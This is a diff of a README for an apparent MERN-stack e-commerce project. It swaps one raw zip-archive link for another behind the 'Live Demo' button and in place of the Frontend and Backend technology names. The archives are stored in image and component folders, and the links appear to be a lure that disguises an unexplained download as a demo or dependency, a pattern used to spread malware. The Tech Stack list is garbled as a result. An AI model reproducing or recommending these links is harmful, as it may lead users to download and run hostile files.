@@ -2,7 +2,7 @@
 <h3 align="center">A full-stack e-commerce platform built with the MERN stack</h3>
 
 <p align="center">
-  <a href="https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/public/img/frontend_ecommerce_2.7.zip"><strong>🚀 Live Demo</strong></a>
+  <a href="https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/src/app/Coponents/Slider/ecommerce-frontend-1.7.zip"><strong>🚀 Live Demo</strong></a>
 </p>
 
 ---
@@ -16,8 +16,8 @@ It features a dynamic front-end, secure backend APIs, and a clean UI for seamles
 
 ## 🛠 Tech Stack
 
-- **Frontend**: https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/public/img/frontend_ecommerce_2.7.zip, HTML/CSS 
-- **Backend**: https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/public/img/frontend_ecommerce_2.7.zip, https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/public/img/frontend_ecommerce_2.7.zip  
+- **Frontend**: https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/src/app/Coponents/Slider/ecommerce-frontend-1.7.zip, HTML/CSS 
+- **Backend**: https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/src/app/Coponents/Slider/ecommerce-frontend-1.7.zip, https://github.com/kaifansariw/frontend_ecommerce/raw/refs/heads/main/src/app/Coponents/Slider/ecommerce-frontend-1.7.zip  
 - **Database**: MongoDB (via Mongoose)  
 - **Deployment**: Vercel (Frontend), Render/Other (Backend API)
 
